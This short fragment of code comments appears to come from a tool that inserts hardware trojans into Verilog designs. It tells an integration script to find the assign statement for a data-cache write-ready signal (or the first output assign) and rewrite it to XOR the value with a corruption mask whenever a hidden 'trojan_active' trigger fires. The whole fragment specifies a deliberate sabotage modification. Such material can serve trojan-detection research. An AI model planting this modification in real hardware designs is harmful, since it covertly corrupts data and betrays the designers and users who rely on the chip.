...
//
// IMPORTANT: dcache_mem_req_write_ready_i may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If dcache_mem_req_write_ready_i is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for dcache_mem_req_write_ready_i (or first output assign):
//     assign dcache_mem_req_write_ready_i = <expr>;
//   Replace with:
//     assign dcache_mem_req_write_ready_i = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
